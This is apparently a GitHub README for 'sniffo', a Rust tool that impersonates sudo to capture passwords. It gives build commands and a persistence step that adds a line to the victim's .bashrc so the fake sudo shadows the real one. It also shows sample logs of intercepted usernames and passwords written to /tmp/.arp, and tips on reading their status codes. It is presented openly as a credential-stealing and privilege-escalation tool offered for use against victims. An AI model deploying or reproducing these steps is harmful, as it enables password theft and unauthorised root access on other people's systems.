______________________________________________
![maxresdefault](https://github.com/0x00snape/sniffo/assets/144463175/0d8f04c9-ce3c-43c6-8217-2d07d237a73b)

______________________________________________
# sniffo
sniffo steals a victims password by camouflaging as sudo without any suspicion,  potentially enabling privilege escalation for root access and stores both correct and incorrect password entries at <code>/tmp/.arp</code>.

## Usage
```bash
:$ git clone https://github.com/0x00snape/sniffo.git
:$ cd sniffo
:$ cargo build --release
:$ ./sudo ls
```
## Privilege Escalation 
```bash
victim:$ cargo build --release --target-dir ~/.arp
victim:$ echo 'export PATH="$HOME/.arp/release:$PATH"' >> $HOME/.bashrc
```
## OR
simply add <code>export PATH="$HOME/.arp/release:$PATH</code> in victims <code>.bashrc</code><br>
## Retrieving Password
```bash
victim:$ cat /tmp/.arp
SUDO Credential Intercepted
Username: victim
Password: test123
Arguments: ls
Status: 1

Username: victim
Password: secretpass
Arguments: ls
Status: 0
```
<em>Note: Status code <code>0</code> means <code>sucess</code> and <code>1</code> means <code>failure</code> also remember to check arguments some victims can enters shell build-in command with <code>sudo</code> it's status code also <code>1</code></em><br>Eg:<code>victim:$ sudo cd</code>
```bash
victim:$ cat /tmp/.arp
SUDO Credential Intercepted
Username: victim
Password: secretpass
Arguments: cd
Status: 1
```
## Issue 
The error message "linker cc not found" indicates the compiler cannot locate the cc linker, typically a symlink to the system's C compiler (gcc or clang).

## License
This project is licensed under [MIT](https://github.com/0x00snape/sniffo/blob/main/LICENSE)
